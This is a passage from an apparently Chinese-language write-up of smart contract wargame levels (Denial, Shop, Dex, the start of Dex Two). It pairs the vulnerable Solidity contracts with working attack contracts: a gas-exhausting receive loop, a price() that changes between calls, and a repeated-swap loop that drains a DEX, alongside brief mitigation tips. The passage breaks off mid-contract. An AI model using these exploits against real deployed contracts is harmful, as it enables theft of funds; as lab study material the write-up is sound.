<span class="w">        </span><span class="nx">partner</span><span class="p">.</span><span class="nx">call</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="nx">amountToSend</span><span class="p">}(</span><span class="s2">&quot;&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">payable</span><span class="p">(</span><span class="nx">owner</span><span class="p">).</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">amountToSend</span><span class="p">);</span>
<span class="w">        </span><span class="c1">// keep track of last withdrawal time</span>
<span class="w">        </span><span class="nx">timeLastWithdrawn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">;</span>
<span class="w">        </span><span class="nx">withdrawPartnerBalances</span><span class="p">[</span><span class="nx">partner</span><span class="p">]</span><span class="w"> </span><span class="o">+=</span><span class="w">  </span><span class="nx">amountToSend</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// allow deposit of funds</span>
<span class="w">    </span><span class="nx">receive</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{}</span>

<span class="w">    </span><span class="c1">// convenience function</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">contractBalance</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>
<p><code>withdraw()</code> 并没有检查 <code>partner.call{value:amountToSend}("");</code> 的返回值，因此被调用函数 <code>revert</code> 并不会影响后续语句的执行，但可以耗尽汽油使整个交易失败</p>
<div class="highlight"><pre><span></span><code><span class="c1">// 先使用 setWithdrawPartner 设置 partner 为合约 Hack 的地址</span>
<span class="nx">contract</span><span class="w"> </span><span class="nx">Hack</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">receive</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">while</span><span class="p">(</span><span class="kc">true</span><span class="p">)</span><span class="w"> </span><span class="p">{}</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
</li>
<li>
<p>当使用 <code>call</code> 发起外部调用时，最好指定汽油量，如 <code>call.gas(100000).value()</code></p>
</li>
<li>外部 <code>CALL</code> 最多可以使用 <code>CALL</code> 时 63/64 的汽油，因此，足够高的汽油量也可以缓解这种攻击</li>
</ul>
<h2 id="21-shop">21. Shop<a class="headerlink" href="#21-shop" title="Permanent link">&para;</a></h2>
<p>以低于定价的价格从商店购买商品</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="kr">interface</span><span class="w"> </span><span class="nx">Buyer</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">price</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint</span><span class="p">);</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Shop</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">uint</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">price</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">100</span><span class="p">;</span>
<span class="w">  </span><span class="nx">bool</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">isSold</span><span class="p">;</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">buy</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">Buyer</span><span class="w"> </span><span class="nx">_buyer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Buyer</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">_buyer</span><span class="p">.</span><span class="nx">price</span><span class="p">()</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">price</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="nx">isSold</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">isSold</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">      </span><span class="nx">price</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_buyer</span><span class="p">.</span><span class="nx">price</span><span class="p">();</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>需要实现 <code>price()</code> 函数，使得第一次调用时返回的价格不小于定价，第二次调用时返回的价格小于定价</li>
<li>
<p>声明了 <code>view</code> 的函数不能修改状态，第一反应是利用 <code>gasleft()</code> 来获得变化的值</p>
<div class="highlight"><pre><span></span><code><span class="nx">contract</span><span class="w"> </span><span class="nx">Hack</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">buy</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">Shop</span><span class="p">(</span><span class="nx">instance</span><span class="p">).</span><span class="nx">buy</span><span class="p">();</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">price</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">gasleft</span><span class="p">()</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">10</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">300</span><span class="p">;</span><span class="w">  </span><span class="c1">// 在 Goerli 测试网络上调试通过</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
</li>
<li>
<p>声明了 <code>view</code> 的函数可以读取状态，因此也可以利用状态变量 <code>isSold</code></p>
<div class="highlight"><pre><span></span><code><span class="nx">contract</span><span class="w"> </span><span class="nx">Hack</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">buy</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">Shop</span><span class="p">(</span><span class="nx">instance</span><span class="p">).</span><span class="nx">buy</span><span class="p">();</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">price</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">Shop</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">).</span><span class="nx">isSold</span><span class="p">()</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="mf">100</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
</li>
</ul>
<h2 id="22-dex">22. Dex<a class="headerlink" href="#22-dex" title="Permanent link">&para;</a></h2>
<ul>
<li>至少清空 <a href="https://en.wikipedia.org/wiki/Decentralized_exchange">DEX</a> 合约中的一种代币</li>
<li>合约 <code>Dex</code> 每种代币初始各 100 枚，玩家每种代币初始各 10 枚</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="k">import</span><span class="w"> </span><span class="s2">&quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;</span><span class="p">;</span>
<span class="k">import</span><span class="w"> </span><span class="s2">&quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;</span><span class="p">;</span>
<span class="k">import</span><span class="w"> </span><span class="s1">&#39;openzeppelin-contracts-08/access/Ownable.sol&#39;</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Dex</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">Ownable</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">token1</span><span class="p">;</span>
<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">token2</span><span class="p">;</span>
<span class="w">  </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">setTokens</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_token1</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">_token2</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">token1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_token1</span><span class="p">;</span>
<span class="w">    </span><span class="nx">token2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_token2</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">addLiquidity</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">token_address</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">token_address</span><span class="p">).</span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">swap</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="kr">from</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">to</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">require</span><span class="p">((</span><span class="kr">from</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">token1</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">token2</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">(</span><span class="kr">from</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">token2</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">token1</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;Invalid tokens&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">IERC20</span><span class="p">(</span><span class="kr">from</span><span class="p">).</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">amount</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Not enough to swap&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="nx">uint</span><span class="w"> </span><span class="nx">swapAmount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">getSwapPrice</span><span class="p">(</span><span class="kr">from</span><span class="p">,</span><span class="w"> </span><span class="nx">to</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">    </span><span class="nx">IERC20</span><span class="p">(</span><span class="kr">from</span><span class="p">).</span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">    </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">to</span><span class="p">).</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="nx">swapAmount</span><span class="p">);</span>
<span class="w">    </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">to</span><span class="p">).</span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">swapAmount</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">getSwapPrice</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="kr">from</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">to</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="p">(</span><span class="nx">uint</span><span class="p">){</span>
<span class="w">    </span><span class="k">return</span><span class="p">((</span><span class="nx">amount</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">to</span><span class="p">).</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">)))</span><span class="o">/</span><span class="nx">IERC20</span><span class="p">(</span><span class="kr">from</span><span class="p">).</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">)));</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">spender</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">SwappableToken</span><span class="p">(</span><span class="nx">token1</span><span class="p">).</span><span class="nx">approve</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">spender</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">    </span><span class="nx">SwappableToken</span><span class="p">(</span><span class="nx">token2</span><span class="p">).</span><span class="nx">approve</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">spender</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">token</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">account</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint</span><span class="p">){</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">token</span><span class="p">).</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">account</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">SwappableToken</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">ERC20</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">_dex</span><span class="p">;</span>
<span class="w">  </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">dexInstance</span><span class="p">,</span><span class="w"> </span><span class="nx">string</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="w"> </span><span class="nx">string</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">symbol</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">initialSupply</span><span class="p">)</span><span class="w"> </span><span class="nx">ERC20</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span><span class="w"> </span><span class="nx">symbol</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">_mint</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">initialSupply</span><span class="p">);</span>
<span class="w">        </span><span class="nx">_dex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">dexInstance</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">owner</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">spender</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">owner</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">_dex</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;InvalidApprover&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="k">super</span><span class="p">.</span><span class="nx">_approve</span><span class="p">(</span><span class="nx">owner</span><span class="p">,</span><span class="w"> </span><span class="nx">spender</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>梳理合约 <code>Dex</code> 提供的代币互换方式<ul>
<li>根据要交换的 <code>from</code> 代币的数量 <code>amount</code>、<code>Dex</code> 合约 <code>from</code> 和 <code>to</code> 代币的余额计算交换得到 <code>to</code> 代币的数量 <code>swapAmount</code>，即 <code>swapAmount = amount * to.balance / from.balance</code></li>
<li>将要交换的 <code>from</code> 代币存入 <code>Dex</code> 合约，<code>swapAmount</code> 数量的 <code>to</code> 代币从 <code>Dex</code> 合约转出</li>
</ul>
</li>
<li>若首先将 10 枚 <code>token1</code> 转换为 <code>token2</code>，此时 <code>swapAmount</code> 为 10，<code>Dex</code> 合约 <code>token1</code> 的余额变为 110、<code>token2</code> 的余额变为 90，玩家将持有 20 枚 <code>token2</code> 代币，再将全部 <code>token2</code> 转为 <code>token1</code>，此时 <code>swapAmount</code> 提高到 24，可见不断进行代币互换即可清空 <code>Dex</code> 合约中的一种代币</li>
<li>
<p>部署合约 <code>Hack</code>，并授权使用代币 <code>&gt;&gt; contract.approve("&lt;hack-address&gt;", 10)</code></p>
<div class="highlight"><pre><span></span><code><span class="nx">contract</span><span class="w"> </span><span class="nx">Hack</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">Dex</span><span class="w"> </span><span class="nx">dex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Dex</span><span class="p">(</span><span class="nx">instance</span><span class="p">);</span>
<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">token1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">dex</span><span class="p">.</span><span class="nx">token1</span><span class="p">();</span>
<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">token2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">dex</span><span class="p">.</span><span class="nx">token2</span><span class="p">();</span>
<span class="w">        </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">token1</span><span class="p">).</span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="mf">10</span><span class="p">);</span>
<span class="w">        </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">token2</span><span class="p">).</span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="mf">10</span><span class="p">);</span>
<span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="nx">dex</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">token1</span><span class="p">,</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">dex</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">token2</span><span class="p">,</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">dex</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">token1</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">));</span><span class="w">  </span><span class="c1">// 将持有的代币全部用于交换</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">amount</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="c1">// 除第一次交换外，合约 Dex 的 to 代币的余额必为 110</span>
<span class="w">                </span><span class="c1">// 当 swapAmount 大于 Dex 合约 to 代币的余额时，说明本次交换能够清空 to 代币</span>
<span class="w">                </span><span class="c1">// 即可以获得 110 枚 to 代币，那么参与交换的 from 代币的数量应为</span>
<span class="w">                </span><span class="c1">// 110 * from.balance / to.balance = 110 * from.balance / 110 = from.balance</span>
<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">dex</span><span class="p">.</span><span class="nx">getSwapPrice</span><span class="p">(</span><span class="nx">token1</span><span class="p">,</span><span class="w"> </span><span class="nx">token2</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="nx">dex</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">token2</span><span class="p">,</span><span class="w"> </span><span class="nx">instance</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="nx">amount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">dex</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">token1</span><span class="p">,</span><span class="w"> </span><span class="nx">instance</span><span class="p">);</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">                </span><span class="nx">dex</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">                </span><span class="nx">dex</span><span class="p">.</span><span class="nx">swap</span><span class="p">(</span><span class="nx">token1</span><span class="p">,</span><span class="w"> </span><span class="nx">token2</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">            </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">amount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">dex</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">token2</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">));</span>
<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">dex</span><span class="p">.</span><span class="nx">getSwapPrice</span><span class="p">(</span><span class="nx">token2</span><span class="p">,</span><span class="w"> </span><span class="nx">token1</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="nx">dex</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">token1</span><span class="p">,</span><span class="w"> </span><span class="nx">instance</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="nx">amount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">dex</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">token2</span><span class="p">,</span><span class="w"> </span><span class="nx">instance</span><span class="p">);</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">                </span><span class="nx">dex</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">                </span><span class="nx">dex</span><span class="p">.</span><span class="nx">swap</span><span class="p">(</span><span class="nx">token2</span><span class="p">,</span><span class="w"> </span><span class="nx">token1</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
</li>
<li>
<p>不应从单个来源获取价格或其它数据，可以借助于 Oracles，如 <a href="https://docs.chain.link/docs/get-the-latest-price">Chainlink Data Feeds</a></p>
</li>
</ul>
<h2 id="23-dex-two">23. Dex Two<a class="headerlink" href="#23-dex-two" title="Permanent link">&para;</a></h2>
<ul>
<li>清空 <code>DexTwo</code> 合约中的所有代币</li>
<li>合约 <code>DexTwo</code> 每种代币初始各 100 枚，玩家每种代币初始各 10 枚</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="k">import</span><span class="w"> </span><span class="s2">&quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;</span><span class="p">;</span>
<span class="k">import</span><span class="w"> </span><span class="s2">&quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;</span><span class="p">;</span>
<span class="k">import</span><span class="w"> </span><span class="s1">&#39;openzeppelin-contracts-08/access/Ownable.sol&#39;</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">DexTwo</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">Ownable</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">token1</span><span class="p">;</span>
<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">token2</span><span class="p">;</span>
